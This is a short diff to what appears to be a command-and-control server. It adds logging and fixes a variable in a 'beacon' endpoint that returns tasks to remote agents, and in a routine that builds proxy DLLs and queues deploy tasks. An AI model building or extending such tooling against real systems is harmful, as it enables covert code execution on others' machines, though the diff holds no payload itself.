@@ -66,6 +66,9 @@ async def beacon(request: Request):
             task_dict["vector"] = build.vector
         tasks_out.append(task_dict)
 
+    if tasks_out:
+        print(f"[CHECKIN] Returning {len(tasks_out)} tasks to {agent_id}: "
+              f"{[t['type'] for t in tasks_out]}", flush=True)
     return {"status": "ok", "tasks": tasks_out}
 
 
@@ -101,7 +104,7 @@ async def upload_dll(
 
     # Build in background
     asyncio.get_event_loop().run_in_executor(
-        None, _run_build, build, build.dll_name, build.arch, agent_id, build.target_id
+        None, _run_build, build, build.dll_name, build.arch, sender_id, build.target_id
     )
 
     return {"status": "building", "build_id": build_id}
@@ -110,6 +113,7 @@ async def upload_dll(
 def _run_build(build, dll_name: str, arch: str, agent_id: str, target_id: int):
     """Run proxy generation + compilation (blocking, runs in thread)."""
     try:
+        print(f"[BUILD] Starting build {build.id} for {dll_name} ({arch})", flush=True)
         proxy_path = build_proxy(
             build_id=build.id,
             original_dll_path=Path(build.original_dll_path),
@@ -118,8 +122,8 @@ def _run_build(build, dll_name: str, arch: str, agent_id: str, target_id: int):
         )
         build.proxy_dll_path = str(proxy_path)
         build.status = BuildStatus.READY
+        print(f"[BUILD] Build {build.id} ready: {proxy_path}", flush=True)
 
-        # Create deploy task for agent
         import uuid
         task = AgentTask(
             id=uuid.uuid4().hex[:12],
@@ -130,10 +134,12 @@ def _run_build(build, dll_name: str, arch: str, agent_id: str, target_id: int):
             status=TaskStatus.PENDING,
         )
         store.tasks[task.id] = task
+        print(f"[BUILD] Deploy task {task.id} created for agent {agent_id}", flush=True)
 
     except Exception as e:
         build.status = BuildStatus.FAILED
         build.error = str(e)
+        print(f"[BUILD] FAILED: {e}", flush=True)
         traceback.print_exc()
 
 
